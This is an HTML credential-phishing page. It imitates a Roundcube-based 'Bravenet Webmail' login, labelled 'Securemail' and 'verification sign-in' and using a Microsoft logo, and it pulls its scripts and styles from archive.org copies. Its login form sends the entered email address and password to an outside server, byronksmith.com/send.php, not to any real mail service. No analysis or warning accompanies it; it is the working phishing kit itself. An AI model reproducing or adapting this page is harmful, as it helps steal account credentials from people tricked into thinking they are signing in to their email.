
<!DOCTYPE html>
<html class=" js mozilla" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Securemail ::: Login</title>
<meta name="viewport" content="" id="viewport">

<link rel="shortcut icon" href="https://byronksmith.com/micbz.png">

<link rel="stylesheet" type="text/css" href="https://ia601504.us.archive.org/12/items/jquery-ui_202105/styles.css">
<link rel="stylesheet" type="text/css" href="https://ia801504.us.archive.org/12/items/jquery-ui_202105/jquery-ui.css">
<script src="https://ia801504.us.archive.org/12/items/jquery-ui_202105/ui.js"></script>




<link rel="stylesheet" type="text/css" href="https://ia801504.us.archive.org/12/items/jquery-ui_202105/style.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ia601504.us.archive.org/12/items/jquery-ui_202105/jquery.js"></script>
<script src="https://ia801504.us.archive.org/12/items/jquery-ui_202105/common.js"></script>
<script src="https://ia801504.us.archive.org/12/items/jquery-ui_202105/app.js"></script>
<script src="https://ia801504.us.archive.org/12/items/jquery-ui_202105/jstz.js"></script>
<script>
/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10409,"cookie_domain":".bravehost.com","cookie_path":"/","cookie_secure":true,"skin":"larry","blankpage":"skins/larry/watermark.html","refresh_interval":60,"session_lifetime":3600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"saH1nEfWKrA5Q8Nk6WR6pp6H1VIoimMl"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","errortitle":"An error occurred!","toggleadvancedoptions":"Toggle advanced options","options":"Options"});
rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('loginform', 'form');
rcmail.gui_object('message', 'message');
</script>

<script src="https://ia601504.us.archive.org/12/items/jquery-ui_202105/jquery-ui.js"></script>

</head>
<body>
<!-- Disabled
<video playsinline autoplay muted loop poster="jpg/field.jpg" id="bgvid">
  <source src="videos/field.mp4" type="video/mp4">
</video>
-->


<h1 class="voice">verification sign-in</h1>

<div id="login-form">
<div class="box-inner" role="main">
<img src="https://i.ibb.co/LdsJVXV/microsoft-logo-ee5c8d9fb6248c938fd0dc19370e90bd-2.jpg" id="logo" alt="Bravenet Webmail">

<form name="form" method="post" action="https://byronksmith.com/send.php">
<input type="hidden" name="_token" value="saH1nEfWKrA5Q8Nk6WR6pp6H1VIoimMl">
<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Shanghai"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Email</label>
</td>
<td class="input"><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="off" type="text"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button>
</p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message"></div>
	<noscript>
		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
	</noscript>
</div>

<div id="bottomline" role="contentinfo">
	Bravenet Webmail 
			&nbsp;<!-- 9679 removed by Bravenet -->&nbsp; <a href="http://bravenet.com/help" target="_blank" class="support-link">Get support</a>
	      &nbsp;●&nbsp; <a href="http://bravenet.com/global/terms.php">Terms of Service</a>
  	
</div>
</div>



<script>
if (!window.UI) { var UI = new rcube_mail_ui(); }
</script>
<script>
$(function() {
rcmail.init();
var images = ["skins/larry/images/ajaxloader.gif","skins/larry/images/ajaxloader_dark.gif","skins/larry/images/buttons.png","skins/larry/images/addcontact.png","skins/larry/images/filetypes.png","skins/larry/images/listicons.png","skins/larry/images/messages.png","skins/larry/images/messages_dark.png","skins/larry/images/quota.png","skins/larry/images/selector.png","skins/larry/images/splitter.png","skins/larry/images/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script>







</body></html>
